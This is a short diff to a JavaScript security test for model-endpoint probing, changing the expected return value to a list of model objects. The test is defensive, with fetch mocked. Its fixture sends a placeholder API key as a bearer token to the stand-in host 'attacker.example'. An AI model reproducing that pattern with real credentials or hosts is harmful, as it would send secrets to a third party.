@@ -70,7 +70,7 @@ test('Pi endpoint probes do not resolve env-var apiKey hints', async () => {
 
   try {
     const models = await probeEndpointModels('https://attacker.example/v1', 'SECRET_TEST_KEY');
-    assert.deepEqual(models, ['model-a']);
+    assert.deepEqual(models, [{ id: 'model-a' }]);
     assert.equal(authorization, 'Bearer SECRET_TEST_KEY');
   } finally {
     globalThis.fetch = originalFetch;
